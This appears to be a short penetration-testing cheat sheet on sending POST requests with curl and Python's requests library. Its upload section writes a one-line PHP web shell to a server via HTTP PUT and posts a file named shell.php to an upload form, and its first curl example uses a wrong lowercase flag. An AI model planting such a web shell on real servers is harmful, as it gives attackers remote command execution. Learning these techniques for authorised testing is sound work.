---
title: "Post Reguests"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - https
  - http
  - web
  - post requests
toc: true
hide_title: true
excerpt: ""
---

Sometimes we need to send post request to target system in order to do some tasks , so here we will how we can use `curl` and `python` in order to send **POST** request

## Curl

### Basic Syntax

```
curl -x POST http://example.com
```

### Sending Additional Data

```
curl -d "user=user1&pass=abcd" -X POST https://example.com/login
```

### Upload Files through POST

```
# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

### Uploading files on the web through put method

```
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```

## Python

```
import requests  
  
url = 'https://www.w3schools.com/python/demopage.php'  
myobj = {'somekey': 'somevalue'}  
  
x = requests.post(url, data = myobj)  

print(x.text)
```